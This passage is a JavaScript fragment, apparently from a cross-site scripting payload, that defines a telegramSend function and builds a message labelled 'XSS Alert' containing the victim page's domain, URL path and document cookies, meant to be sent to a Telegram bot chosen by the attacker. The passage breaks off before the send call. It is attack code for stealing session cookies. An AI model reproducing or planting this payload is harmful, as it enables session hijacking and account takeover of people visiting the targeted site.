...
function telegramSend(tokenBot, chatId) {
	var textData = 'XSS+Alert+in+' + document['domain']+'%0d%0a------------------------------------------------%0d%0a%0d%0a-+URL+Target+-%0d%0a' + document['location']['hostname'] + document['location']['pathname'] + '%0d%0a%0d%0a-+Document+Cookie+-%0d%0a' + document['cookie'] + '+';
